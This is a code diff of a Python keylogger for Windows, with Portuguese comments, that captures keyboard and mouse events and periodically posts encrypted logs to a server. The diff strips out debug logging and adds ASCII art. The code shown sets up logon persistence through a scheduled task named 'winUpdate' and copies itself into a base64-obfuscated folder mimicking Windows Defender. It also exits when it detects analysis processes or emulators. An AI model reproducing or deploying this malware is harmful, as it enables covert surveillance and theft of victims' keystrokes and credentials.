@@ -12,6 +12,51 @@ Informações do Código:
     - O script utiliza threads para monitorar eventos do teclado e mouse, além de enviar logs periodicamente.
     - O script exibe uma janela de aviso ao usuário quando executado.
     - O script deve ser executado em um ambiente Windows, pois utiliza bibliotecas específicas do Windows.
+    
+                        █████     █████                                    
+                     ████   ████████  ███                                  
+                    ███       ██        ██                                 
+                   ██            █      ██                                 
+                  ██    ██     ███    █████████████                        
+                 ███    ███     ██              ███████                    
+                 ██      █                           ████                  
+                 ██                                     ███                
+                 ███                                      ███              
+                 ████                                      ████            
+               ████                           ███████        ███    ████   
+             ████                          ████     ████      ████████████ 
+            ███                          ███           ███      ███      ██
+           ██                          ███               ███     ███  ███ █
+         ███                          ███                  ██     ██████   
+        ███                          ███                   ███     ███  ██ 
+        ██              ███          ██                     ██     ███████ 
+       ██         █████████████     ███    █████            ██      ███    
+      ███       ███           ███    ██   ███ ████          ██      ███████
+     ███      ███               ███  ██   ██    ██         ██        ███   
+     ██      ██                  ██   ██  ███             ███        ███   
+     ██     ██                    ██   ██               ███         ████   
+     ██    ██              █████  ██     ███        ████        ████████   
+    ███    ██             ███ ███  ██      ████████         █████   █████  
+     ██    ██             ███  ██  ██                   █████   █████ ███  
+     ██    ██             ███     ███               █████   ██████  ███████
+     ███    ██                    ██            █████    █████  █████      
+   █████     ██                  ██         █████    ██████ █████          
+ ████████     ███             ████      █████    ██████  █████             
+███    ███      ██████ ████████     █████    █████████████                 
+██   █████                       ████    ██████       ███                  
+██ ████  ██                  █████    ███████          ███                 
+███    █████              ████    █████    ███          ███                
+ ███ ████  ███        ████    ██████       ████         ███                
+  ███  ███████████ ████    ████   ██        ███         ██                 
+   █████        ████   ████   ██████                   ██                  
+    ██            ██████  █████   ██                 ███           ███     
+   ██              ██  █████      ███              ████       ██  ███      
+   █              ██████           ████         █████          ████        
+  ██             ████                █████████████                         
+   ██                                    ████                              
+    ███                                                                    
+     ████████████████████                    █              ██             
+          ████         ██                  ███             ██              
 '''
 
 from pynput import keyboard, mouse
@@ -27,12 +72,6 @@ internet = False
 intervalo_envio = None
 pgp_chavepublica = None
 uuid_pc = None
-
-def printar(dados):
-    # insere, dentro do arquivo "teste.txt", os dados passados como parâmetro
-    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    with open("teste.txt", "a") as f:
-        f.write(timestamp + " – " + dados + "\n")
 
 def adicionar_persistencia():
     subprocess.run(f'schtasks /create /tn "winUpdate" /f /tr "{os.path.abspath(sys.executable)}" /sc onlogon', shell=True)
@@ -50,20 +89,15 @@ def carregar_chave_publica():
     pgp_chavepublica = chavepublica
 
 def copiar_para_caminho():
-    printar("Tentar copiar")
     destino = base64.b64decode("QzpcUHJvZ3JhbSBGaWxlc1xXaW5kb3dzIERlZmVuZGVyXE9mZmxpbmVc").decode("utf-8")
-    printar("destino: "+str(destino))
     if not os.path.exists(destino):
         os.makedirs(destino, exist_ok=True)
     novo_caminho = os.path.join(destino, os.path.basename(__file__).replace(".py", ".exe"))
-    printar("novo_caminho: "+str(novo_caminho))
     if os.path.abspath(sys.executable) != novo_caminho:
         try:
-            printar("Copiando "+ os.path.abspath(sys.executable))
             shutil.copy2(os.path.abspath(sys.executable), novo_caminho)
-            printar("Copiado!")
-        except Exception as e:
-            printar("Erro ao copiar: " + str(e))
+        except Exception:
+            pass
 
 def detectar_click(x, y, botaoMouse, pressionado):
     if pressionado:
@@ -102,13 +136,9 @@ def enviar_post(uuid, datahora, log):
 
 def executar_novo_programa():
     caminho = base64.b64decode("QzpcUHJvZ3JhbSBGaWxlc1xXaW5kb3dzIERlZmVuZGVyXE9mZmxpbmVc").decode("utf-8") + os.path.basename(__file__).replace(".py", ".exe")
-    printar("Caminho: " + str(caminho))
     try:
-        printar("Tentando abrir")
         subprocess.Popen(caminho, shell=True)
-        printar("Abriu")
-    except Exception as e:
-        printar("Erro ao abrir o programa: " + str(e))
+    except Exception:
         pass
 
 def janela_aviso(threads_encerrar):
@@ -418,25 +448,18 @@ def main():
         threading.Thread(target=thread_teclado, daemon=True),
         threading.Thread(target=thread_mouse, daemon=True),
     ]
-    printar(str(threads))
     threading.Thread(target=janela_aviso, args=(threads,), daemon=False).start()
-    printar("Janela de aviso iniciada.")
     global internet, uuid_pc
     while not internet:
-        printar("Tentando conectar à internet...")
         try:
             requests.get("https://www.google.com/", timeout=5)
             internet = True
-            printar("Conexão com a internet estabelecida.")
         except requests.ConnectionError:
             internet = False
             time.sleep(5)
     carregar_chave_publica()
     aleatorizar_intervalo_envio()
-    printar("Chave pública carregada e intervalo de envio aleatorizado:" + str(intervalo_envio) + " segundos.")
     uuid_pc = pegar_uuid()
-    printar("UUID do computador obtido: " + str(uuid_pc))
-    printar("Pegando dados do sistema...")
     pegar_dados_do_sistema()
     for t in threads:
         t.start()
@@ -445,18 +468,12 @@ def main():
 
 if __name__ == "__main__":
     if verifica_processo() or verifica_emulador():
-        printar("Verificação de processo ou emulador falhou, encerrando programa.")
         os._exit(0)
     else:
         if not verifica_caminho():
-            printar("Caminho inválido, copiando programa.")
             copiar_para_caminho()
-            printar("Adicionando persistência.")
             adicionar_persistencia()
-            printar("Executando novo programa.")
             executar_novo_programa()
-            printar("Encerrando programa.")
             os._exit(0)
         else:
-            printar("Executando programa.")
             main()
